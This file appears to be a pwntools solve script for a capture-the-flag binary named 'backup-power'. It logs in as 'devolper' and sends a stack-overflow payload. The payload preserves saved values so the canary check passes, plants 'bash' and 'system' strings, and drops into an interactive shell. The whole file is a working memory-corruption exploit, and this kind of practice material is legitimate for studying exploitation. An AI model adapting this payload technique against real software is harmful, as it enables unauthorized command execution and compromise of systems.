#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './backup-power' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
# libc = '/usr/lib/libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '', 1337 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *0x400e9c
# break *develper_power_management_portal
# break *0x400eb4
# break *0x400cac
# break *0x400cf4
break *0x400d34
break *0x400d80
break *0x400d9c
# break *0x400dc8
# break *0x400e10
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================

# $4 = (char (*)[32]) 0x2b2ab460
# $5 = (char (*)[32]) 0x2b2ab480
# $6 = (char (*)[32]) 0x2b2ab4a0
# $7 = (char (*)[32]) 0x2b2ab4c0



# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    # solve script by HyggeHalcyon
    io.sendlineafter(b'Username:', b'devolper')
    
    payload = cyclic(24)
    payload += b'bash\x00'.ljust(44-len(payload), b'\x00')
    payload += flat([
            0x400b0c,       # preserve `rip` to bypass canary check
            p32(0x1) * 5,   # random val for fuzz
            0x4aa330,       # preserve some value
            p32(0x4aa330),  # preserve some value
            0x4721c8,       # preserve some value
            p32(0x3) * 2,   # random val for fuzz
            0x400b0c,       # preserve some value
    ]) 
    payload +=  cyclic(204)
    payload += b'system\x00'
    
    sleep(0.2)
    io.sendline(payload)
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()